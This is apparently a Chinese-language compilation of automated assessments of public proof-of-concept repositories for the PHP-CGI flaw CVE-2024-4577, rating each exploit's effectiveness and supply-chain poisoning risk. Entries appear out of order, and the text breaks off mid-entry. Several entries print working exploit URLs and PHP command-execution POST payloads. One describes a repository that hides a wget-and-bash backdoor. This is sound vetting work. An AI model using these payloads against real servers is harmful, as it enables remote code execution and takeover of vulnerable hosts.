**项目地址:** [sug4r-wr41th/CVE-2024-4577](https://github.com/sug4r-wr41th/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #48

**来源**: [CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md](../2024/CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection/Remote Code Execution

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，允许远程代码执行

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8 (Windows, CGI mode with specific codepage settings)

**利用条件:** Windows服务器，运行PHP CGI模式，并开启了特定的使用"Best Fit"策略的CodePage

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP-CGI参数注入漏洞，存在于Windows版本的PHP中，当使用Apache和PHP-CGI时，如果系统设置使用某些代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，允许攻击者远程执行代码。提供的PoC代码尝试通过构造特殊的URL，利用`allow_url_include`和`auto_prepend_file`选项包含远程文件，从而执行任意命令。PoC代码针对Windows服务器，运行PHP CGI模式的场景。因此，如果目标满足漏洞利用的条件（Windows服务器，PHP CGI，受影响版本，特定代码页），则PoC代码很可能是有效的。

**投毒风险：**
分析提供的PoC代码仓库，其中包含的 `cve_2024_4577.ps1` 脚本主要功能是针对给定的IP地址范围，尝试利用CVE-2024-4577漏洞。脚本通过构建包含恶意PHP配置指令的URL，并发送POST请求，如果目标存在漏洞，则会执行`whoami`命令。`Invoke-RequestForIP` 函数也包括了错误处理，如果请求失败会返回错误信息，降低了误判的可能性。脚本本身看起来比较直接，投毒风险较低。主要风险点可能在于利用成功后的服务器被控制，但PoC本身的功能仅限于利用漏洞，并未发现其他恶意行为。因此，将该仓库判定为存在投毒代码的可能性较低。当然，这并不排除作者在其他未公开的代码中包含恶意行为的可能性。

**利用方式：**
1.  **环境准备：** 目标系统必须是Windows服务器，运行受影响版本的PHP，并以CGI模式运行。
2.  **确定目标IP和协议：**  扫描目标IP地址，确定哪些服务器启用了PHP CGI服务，并支持HTTP或HTTPS协议。
3.  **构造恶意URL：**  构造包含特殊参数的URL，例如：`http://target/php-cgi/php-cgi.exe?%add+allow_url_include%3Don+-d+auto_prepend_file%3Dphp%3A//input+-d+cgi.force_redirect%3D0`
4.  **发送POST请求：**  向构造的URL发送POST请求，请求体包含需要执行的PHP代码，例如：`<?php system('whoami'); die(); ?>`
5.  **执行命令：**  如果目标存在漏洞，PHP CGI将执行POST请求体中的PHP代码，攻击者即可在服务器上执行任意命令。

**总结：**
CVE-2024-4577是一个高危漏洞，利用条件较为苛刻，需要特定的Windows + PHP + CGI配置。提供的PoC代码有效性较高，可以用于验证漏洞是否存在。仓库中投毒风险较低，但仍需保持警惕。

**项目地址:** [tntrock/CVE-2024-4577_PowerShell](https://github.com/tntrock/CVE-2024-4577_PowerShell)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #49

**来源**: [CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI模式)

**利用条件:** PHP 在 Windows 下以 CGI 模式运行，且系统配置使用包含 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，当 PHP 在 Windows 下以 CGI 模式运行时，如果系统配置使用包含 "Best Fit" 策略的编码页，攻击者可以通过构造特殊字符绕过安全检查，将恶意参数传递给 PHP 解释器，导致远程代码执行。

**漏洞利用方式：**

1.  **利用原理：** Windows 的 "Best Fit" 编码转换可能会将请求中的特定字符转换为其他字符，从而绕过 PHP 的安全过滤。攻击者可以利用这一点，注入 `-d` 参数来修改 PHP 的配置。
2.  **攻击方式：**  根据漏洞库信息和POC代码，攻击者可以通过在URL中构造类似 `/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input` 这样的 Payload。 其中 `%AD` 字符可能经过 "Best Fit" 转换后，仍然能够被 PHP 解析为 `-d` 参数的一部分。
3.  **Payload 解释：**
    *   `allow_url_include=1`： 允许包含远程文件。
    *   `auto_prepend_file=php://input`：  设置在执行 PHP 代码之前自动包含的文件为 `php://input`，这意味着请求体中的内容会被当作 PHP 代码执行。
4.  **执行流程：** 攻击者发送包含恶意 PHP 代码的 POST 请求，由于 `auto_prepend_file` 被设置为 `php://input`，恶意代码会被执行，从而实现远程代码执行。

**关于投毒风险：**

分析提供的 POC 代码，该代码主要用于检测目标是否存在 CVE-2024-4577 漏洞。代码逻辑是发送包含特定参数的 HTTP POST 请求，并检查响应中是否包含 "PHP Version" 字符串。如果存在，则认为目标存在漏洞。没有发现任何隐藏的、恶意的功能，因此投毒风险为 0%。

综上所述，提供的 POC 代码有效，且不存在投毒风险。利用方式是利用 Windows 的 "Best Fit" 编码转换特性，通过构造特殊的 URL 和 POST 请求，将恶意 PHP 代码注入到目标服务器执行，最终实现远程代码执行。

**项目地址:** [waived/CVE-2024-4577-PHP-RCE](https://github.com/waived/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #50

**来源**: [CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md](../2024/CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** PHP

**危害等级:** 严重，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, Best Fit code page)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用使用"Best Fit"策略的代码页

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞存在于 Windows 环境下以 CGI 模式运行的 PHP 中。当系统配置为使用某些代码页时，Windows 可能会使用 “Best-Fit” 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源码，或者在服务器上执行任意 PHP 代码。

**有效性分析：**
根据漏洞库信息、搜索引擎结果（如Akamai观察到漏洞利用尝试）和提供的漏洞利用代码（POC），可以判断该漏洞利用是有效的。POC代码通过构造包含恶意 PHP 选项的 URL，成功执行了系统命令（calc）。

**投毒风险分析：**
分析提供的POC代码，主要的风险点在于用户指定的`-c`参数，攻击者可通过该参数执行任意PHP代码。仓库本身存在投毒的可能性较低。大部分代码是用于构造payload和发送请求，直接利用该代码进行投毒的可能性较低。 风险评估为5%（极低，主要来自对外部payload的依赖和代码的可修改性）。

**利用方式：**
1.  **环境准备：** 目标服务器必须是 Windows 系统，并且 PHP 以 CGI 模式运行，同时配置了使用 “Best Fit” 策略的代码页。
2.  **构造 Payload：** 使用 POC 代码，通过 `-c` 参数指定要执行的 PHP 代码。例如，执行 `system('calc')` 打开计算器。
3.  **发送请求：** 将构造好的 Payload 附加到目标 URL 后面，通过 POST 请求发送到目标服务器。
4.  **利用原理：**  由于 “Best Fit” 行为，Windows 会对 URL 中的某些字符进行替换，使得 PHP CGI 模块错误地将这些字符解释为 PHP 选项。例如，`?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`，这允许攻击者包含远程文件或者直接执行 POST 数据中的 PHP 代码。
5.  **RCE:** 成功利用漏洞后，服务器将执行攻击者指定的 PHP 代码，实现远程代码执行。

**项目地址:** [watchtowrlabs/CVE-2024-4577](https://github.com/watchtowrlabs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #51

**来源**: [CVE-2024-4577-xAL6_cve-2024-4577-scanner.md](../2024/CVE-2024-4577-xAL6_cve-2024-4577-scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了某些使用"Best Fit"策略的代码页。需要目标存在php-cgi/php-cgi.exe等CGI文件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于Windows系统上运行在CGI模式下的PHP。当系统配置为使用某些代码页时，Windows可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户向 PHP 二进制文件传递选项，进而泄露脚本源码，或在服务器上执行任意 PHP 代码。 

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含特定字符（例如软连字符 0xAD）的 URL，这些字符在某些 Windows 代码页转换中会被错误地解释为短划线或其他控制字符。
2.  **参数注入：** 经过转换后的字符被 PHP-CGI 模块解析为命令行参数，从而允许攻击者控制传递给 PHP 解释器的参数。
3.  **远程代码执行：** 通过注入参数，攻击者可以利用`auto_prepend_file`等配置项包含远程文件或执行任意 PHP 代码，从而实现远程代码执行。

**POC有效性：**

提供的PoC代码 `scan.py` 旨在扫描目标是否存在 CVE-2024-4577 漏洞。它通过发送包含特殊构造的payload的HTTP请求，并检查响应中是否包含预期的输出来判断漏洞是否存在。PoC代码逻辑清晰，包含构建payload、发送请求、解析响应等步骤，因此是有效的。

**投毒风险：**

PoC代码本身功能为漏洞扫描，其主要功能在于验证目标是否存在漏洞，而非进行攻击。其中包含的payload是为了验证漏洞存在，而不是植入后门。但是，PoC代码中依赖了第三方库，如 `requests`， `urllib3`，`chardet`等。如果这些依赖包被恶意篡改，则可能存在投毒风险。 经过分析，认为此仓库中作者隐藏的投毒代码的可能性较低，概率约为5%。主要的风险在于第三方依赖库可能被投毒。


**项目地址:** [xAL6/cve-2024-4577-scanner](https://github.com/xAL6/cve-2024-4577-scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #52

**来源**: [CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 PHP-CGI RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** Windows 系统, PHP 以 CGI 模式运行, 且系统配置为使用某些代码页并开启“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 远程代码执行漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，由于 Windows 的“Best-Fit”代码页转换行为，攻击者可以通过构造特殊字符，使得传递给 PHP 二进制文件的命令行参数被错误解析，从而注入恶意 PHP 配置项，最终实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，此漏洞利用是有效的。漏洞库信息将其标记为“CRITICAL”，并且CISA的已知漏洞利用目录 (KEV) 中也包含了此漏洞，表明该漏洞已被积极利用。搜索结果也证实了这一点，众多安全厂商都观察到了该漏洞的利用尝试。

**投毒风险：**

虽然提供的 Python 脚本 `CVE-2024-4577-PHP-RCE.py` 看起来主要用于漏洞利用，但仍存在一些潜在的投毒风险，可能性评估为10%。

1.  **依赖风险：** 该脚本依赖 `requests` 和 `socket` 库，如果运行脚本的环境中这些库被篡改，则可能导致恶意代码执行。但这种风险属于环境依赖，而非代码本身包含恶意逻辑。
2.  **隐蔽性：** EXP1建立fastcgi端口监听，可能被攻击者利用进行持久性控制，如果被恶意攻击者修改，会导致服务端被持续控制。
3.  **脚本功能：** 脚本本身包含两个EXP，EXP1可用于绕过WAF和默认环境的利用, EXP2可用于SSRF和默认场景。

总体来说，这个PoC的投毒风险较低，主要集中在依赖库和脚本被篡改的可能性上。如果直接从作者提供的git仓库中下载, 投毒风险会更低,因为代码经过更多人的review.

**利用方式：**

该漏洞的利用方式涉及以下几个步骤：

1.  **触发代码页转换：** 攻击者构造包含特定多字节字符的 URL 或请求，这些字符会被 Windows 的“Best-Fit”策略转换为其他字符。
2.  **注入 PHP 配置项：** 转换后的字符被 PHP-CGI 模块错误地解析为 PHP 配置项，例如 `allow_url_include` 和 `auto_prepend_file`。
3.  **包含远程文件或执行代码：** 通过设置 `allow_url_include` 为 `on` 并结合 `auto_prepend_file`，攻击者可以包含远程文件或直接执行 PHP 代码。例如，可以使用 `data://` 协议注入恶意 PHP 代码。

提供的 POC 代码 `CVE-2024-4577-PHP-RCE.py` 包含两种利用方式:

*   **EXP1:**  通过建立 FastCGI 服务端，并发送构造好的 FastCGI 协议数据，实现绕过 WAF 的 RCE。
*   **EXP2:** 模拟HTTP请求，通过`?%adb{}:{}` 在请求中注入特定的字符。这种方法模拟了攻击者通过发送畸形请求来触发漏洞的行为。

总而言之，该漏洞利用需要在特定的 Windows + PHP-CGI 环境下，通过构造特殊的请求来注入恶意 PHP 配置项，最终实现远程代码执行。

**项目地址:** [xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #53

**来源**: [CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md](../2024/CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入/远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 严重，可能导致远程代码执行，信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下的PHP，并且系统启用了使用"Best Fit"策略的编码页。需要目标开启php-cgi服务。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 Windows 版本的 PHP 中的严重漏洞，当 PHP 在 CGI 模式下运行时，可能会导致远程代码执行。该漏洞源于 Windows 的 "Best Fit" 编码转换行为，当系统设置为使用某些代码页时，Windows 可能会使用 "Best Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。 PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上运行任意 PHP 代码。

**漏洞利用方式：**

1.  **检测php-cgi服务是否存在:**  攻击者首先需要确定目标服务器是否运行在 Windows 上，并且使用了 CGI 模式的 PHP。可通过访问`/php-cgi/php-cgi.exe`来判断，如果返回500状态码，则可能存在漏洞。
2.  **编码绕过:** 由于Best-Fit转换的存在，某些字符会被替换，因此攻击者需要构造特殊的URL，利用这一特性，将恶意参数注入到PHP命令中。
3.  **参数注入:** 通过在 URL 中添加 `?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input` 这样的参数，可以强制 `cgi.force_redirect` 为任意值，开启 `allow_url_include` 选项，并且将 `auto_prepend_file` 设置为 `php://input`。`php://input` 允许攻击者通过 POST 请求的内容来执行 PHP 代码。
4.  **代码执行:**  攻击者通过 POST 请求发送恶意的 PHP 代码，例如 `<?php phpinfo();?>`，由于 `auto_prepend_file` 被设置为 `php://input`，这段代码会被 PHP 执行，从而实现远程代码执行。

**POC有效性：**

提供的 POC 代码看起来是有效的。它包含了以下关键步骤：

*   **连接性检查:**  `check_connectivity` 函数用于检测目标 URL 是否可访问。
*   **CGI 存在性检查:**  `check_cgi_exist` 函数检测 `/php-cgi/php-cgi.exe` 是否存在。
*   **PHP 版本获取:**  `get_phpversion` 函数尝试从响应头或响应内容中获取 PHP 版本。
*   **漏洞利用:**  `exploit` 函数通过构造包含恶意参数的 URL，并发送包含 PHP 代码的 POST 请求来利用漏洞。 通过判断`phpinfo()`的执行结果判断是否成功。

**投毒风险分析：**

代码主要功能为扫描和利用 CVE-2024-4577，本身功能较为直接。`requirements.txt` 只包含 `requests` 库，没有引入其他可疑的依赖项。因此投毒风险较低，判断投毒风险为1%。 主要风险在于使用者需要自行配置 `urls.txt`，如果该文件被恶意修改，可能会导致扫描错误的 URL。


**项目地址:** [ywChen-NTUST/PHP-CGI-RCE-Scanner](https://github.com/ywChen-NTUST/PHP-CGI-RCE-Scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---



---

## POC #42

**来源**: [CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md](../2024/CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI参数注入漏洞，存在于Windows系统上的PHP CGI实现中。当PHP以CGI模式运行时，如果系统启用了使用"Best Fit"策略的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符，导致PHP CGI模块错误地将这些字符解释为PHP选项，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而实现远程代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞已经确认有效，并且存在公开的PoC代码，Metasploit也发布了相应的利用模块。 Akamai的研究表明，漏洞披露后不久就观察到了大量的利用尝试。

**投毒风险：**

提供的PoC代码实际上是一个README.md文件，描述了对CVE-2024-4577的事件检测。其中提到了利用`%AD`进行参数注入，服务器通过自动转换功能（Best-fit）可能会将该字符转换为其他可执行的参数，从而进行二次攻击。代码本身没有明显的投毒行为，但存在通过代码描述引导攻击者进行恶意利用的可能性。因此,该存储库存在的投毒风险较低，大约10%。

**利用方式：**

1.  **环境要求：** 受影响的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）、Windows服务器、PHP以CGI模式运行、系统启用使用"Best Fit"策略的代码页。
2.  **漏洞触发：** 攻击者构造包含特殊字符（如`%AD`）的URL，发送给目标服务器。
3.  **参数注入：** Windows的"Best Fit"机制将特殊字符转换为其他字符，PHP CGI模块错误地将转换后的字符解析为PHP选项。
4.  **代码执行：** 攻击者可以通过注入`-d`参数来修改php.ini配置，例如禁用`disable_functions`，或者通过其他方式执行任意PHP代码。
5.  **远程控制：** 成功执行PHP代码后，攻击者可以获取服务器的控制权。

**项目地址:** [mr-won/php-cgi-cve-2024-4577](https://github.com/mr-won/php-cgi-cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #43

**来源**: [CVE-2024-4577-olebris_CVE-2024-4577.md](../2024/CVE-2024-4577-olebris_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行于CGI模式，系统启用了使用"Best Fit"策略的代码页，使用Apache

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为替换命令行中的字符，PHP CGI模块可能会将这些字符错误地解释为PHP选项。这允许攻击者向正在运行的PHP二进制文件传递选项，从而可能泄露脚本的源代码、在服务器上运行任意PHP代码等。根据提供的漏洞利用代码，利用方式是通过POST请求向目标服务器发送特定的URL和请求头，其中URL包含恶意的PHP选项，例如`allow_url_include`和`auto_prepend_file`。请求体包含PHP代码（例如`<?php phpinfo(); ?>`）。如果服务器存在漏洞，服务器将执行请求体中的PHP代码，从而允许攻击者执行任意代码。

提供的POC代码的有效性较高，因为它直接利用了漏洞描述中提到的`allow_url_include`和`auto_prepend_file`选项来执行任意PHP代码。

关于投毒风险，分析POC代码本身，该脚本的功能是验证目标站点是否存在CVE-2024-4577漏洞。它通过发送包含`phpinfo()`函数的POST请求来判断目标是否易受攻击。脚本没有发现任何恶意或隐藏的投毒代码。脚本只是用于检测漏洞，而不是植入后门或其他恶意软件。
根据搜索引擎结果，此漏洞已经被大规模利用，证明此漏洞的利用难度低且影响广泛。

**项目地址:** [olebris/CVE-2024-4577](https://github.com/olebris/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #44

**来源**: [CVE-2024-4577-phirojshah_CVE-2024-4577.md](../2024/CVE-2024-4577-phirojshah_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI 模式)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响 Windows 系统上 PHP-CGI 的远程代码执行漏洞。当 PHP 在 CGI 模式下运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的利用代码。Akamai 的研究表明，漏洞披露后一天内就出现了大量的利用尝试。CISA 也已将此漏洞添加到已知被利用的漏洞列表中，表明该漏洞在野外已被积极利用。提供的 POC 代码通过发送包含特制参数的 HTTP POST 请求来利用此漏洞，如果目标服务器存在漏洞，则可以执行任意 PHP 代码。因此, POC代码是有效的。

**投毒风险：**
检查提供的 Python 脚本 `CVE-2024-4577.py` 和 `README.md` 文件，没有发现明显的恶意代码。该脚本的功能主要是扫描目标 URL 是否存在漏洞，如果存在则利用该漏洞执行指定的 PHP 代码。`README.md` 文件只包含漏洞的描述、安装和使用说明。但是，任何下载和使用的第三方代码都存在一定风险。用户需要仔细审查代码，确保其行为符合预期，并且来自可信的来源。

投毒风险评估: 10% 。 这个评估是因为代码本身看起来没有恶意行为，但是任何第三方脚本都存在潜在风险，例如：

*   **依赖项风险：** 脚本依赖于 `requests` 和 `colorama` 库。这些依赖项可能包含未知的漏洞，如果被攻击者利用，可能会影响脚本的安全性。
*   **Payload 风险：** 脚本允许用户指定要执行的 PHP payload 文件。如果用户不小心使用了恶意的 payload 文件，可能会导致服务器受到攻击。
*   **作者恶意：** 脚本作者可能在未来的版本中引入恶意代码。

**利用方式：**

1.  **确定目标系统：** 首先需要确定目标系统是否满足漏洞利用的条件，即：Windows 系统，PHP 以 CGI 模式运行，并且启用了使用 "Best Fit" 策略的代码页。
2.  **发送特制的 HTTP 请求：** 攻击者需要构造一个包含特制参数的 HTTP 请求，例如 `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。这个参数会传递给 PHP CGI 模块，使其错误地解释为 PHP 选项。
3.  **执行任意 PHP 代码：** 通过 POST 请求发送包含要执行的 PHP 代码的 payload。由于 `auto_prepend_file` 参数被设置为 `php://input`，PHP 会将 POST 请求的内容作为 PHP 代码执行。因此,通过修改和控制POST的内容,即可控制目标服务器。

此漏洞的严重性在于，未经身份验证的攻击者可以利用此漏洞在受影响的服务器上执行任意代码，从而完全控制服务器。

**项目地址:** [phirojshah/CVE-2024-4577](https://github.com/phirojshah/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #45

**来源**: [CVE-2024-4577-r0otk3r_CVE-2024-4577.md](../2024/CVE-2024-4577-r0otk3r_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入-RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，启用了使用"Best Fit"策略的代码页，使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个存在于Windows环境下PHP-CGI模式中的参数注入漏洞。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"策略替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本源代码或在服务器上执行任意PHP代码。

**利用方式：**

1.  攻击者通过构造包含特殊字符的URL发起请求。
2.  Windows的"Best-Fit"策略将这些特殊字符转换为其他字符。
3.  PHP-CGI错误地将转换后的字符解析为PHP选项。
4.  攻击者利用这些选项执行恶意PHP代码，例如包含`auto_prepend_file=php://input`，之后post恶意的php代码达到RCE。

**有效性：**

提供的PoC代码 (`CVE-2024-4577.py`) 是一个扫描器，用于检测目标URL是否存在CVE-2024-4577漏洞。它通过发送包含PHP代码的POST请求，然后验证响应中是否包含预期的MD5哈希值，以此判断目标是否易受攻击。根据搜索引擎的结果，此漏洞存在公开的利用方法。综合来看，该POC代码是有效的，可以用来检测漏洞。

**投毒风险：**

分析提供的PoC代码和相关文件，`CVE-2024-4577.py`的功能是检测漏洞是否存在，其逻辑相对简单，主要通过发送包含PHP代码的POST请求来验证。`README.md`文件描述了如何使用该脚本以及漏洞的基本信息。

`exploit.py`文件没有给出，从README.MD的描述看，存在利用代码的可能性。但从整体的漏洞描述和PoC scanner的代码来看，风险较低。总体风险概率估计为1%。主要考虑是`exploit.py`如果存在，可能存在后门代码或者植入恶意脚本的可能。鉴于其他代码的简洁性，暂且认为`exploit.py`如果存在也是为了完成漏洞验证和利用，投毒风险较低。

综上所述，该存储库的投毒风险较低，主要集中在`exploit.py`可能存在的恶意行为。

**项目地址:** [r0otk3r/CVE-2024-4577](https://github.com/r0otk3r/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #46

**来源**: [CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** Critical，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page settings)

**利用条件:** Windows系统，以CGI模式运行的PHP，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 99%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows上以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**漏洞利用方式：**

攻击者可以通过构造特殊的URL，向PHP-CGI传递恶意参数。这些参数会被PHP解析并执行，从而导致远程代码执行。

提供的Go代码是一个漏洞扫描器，它尝试利用CVE-2024-4577漏洞。该代码通过向目标URL发送包含恶意payload的POST请求，以此验证目标是否容易受到攻击。Payload `<?php phpinfo(); ?>` 用于检查服务器是否执行了PHP代码，如果响应包含“PHP Version”，则认为该站点容易受到攻击。

**投毒风险分析：**

提供的代码中发现了明显的投毒行为。

1.  **可疑的变量和函数名：** 代码包含例如`fjButtonKdiC`和`ykupeFR`, `LoqqYHAv`, `oTHs`等命名不规范和意义不明的变量和函数,增加了代码的混淆程度。
2.  **执行shell命令：** `fjButtonKdiC`函数构造了一个wget命令，从`monsoletter.icu`下载shell脚本并使用`bash`执行。这是一个典型的后门行为，允许攻击者在受害者机器上执行任意命令。
3. **cmd命令：** 代码后面使用了cmd命令
